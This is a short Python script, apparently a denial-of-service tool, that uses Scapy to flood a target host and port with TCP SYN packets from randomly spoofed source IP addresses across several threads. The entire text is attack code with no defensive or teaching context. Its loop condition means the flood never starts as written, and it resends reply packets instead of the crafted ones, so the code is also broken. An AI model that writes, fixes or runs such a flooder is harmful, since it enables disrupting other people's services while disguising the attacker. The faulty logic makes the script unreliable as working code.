import random
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import sys
import threading
target = str(sys.argv[1])
port = int(sys.argv[2])
tim1 = int(sys.argv[3])
thread = int(sys.argv[4])

def start():    
    counter = 0
    while counter == tim1*10:
        source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = sr1(IP(src=source_ip, dst=target) / TCP(sport=RandShort(), dport=port, flags="S"))
        send(packet)
        counter += 1

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
